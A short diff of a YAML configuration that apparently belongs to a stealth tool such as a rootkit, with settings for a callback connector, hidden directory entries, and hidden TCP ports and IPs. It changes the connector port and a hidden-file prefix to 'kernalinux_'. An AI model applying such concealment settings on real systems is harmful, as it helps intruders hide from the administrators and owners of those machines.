@@ -4,11 +4,11 @@ module:
     version: "1.0"
 connector:
     ip: "127.0.0.1"
-    port: "1337"
+    port: "3337"
 hideme: false
 hide_dent:
     - "91746"
-    - "1337test_"
+    - "kernalinux_"
 hide_tcp_port:
     - "8080"
 hide_tcp_ip:
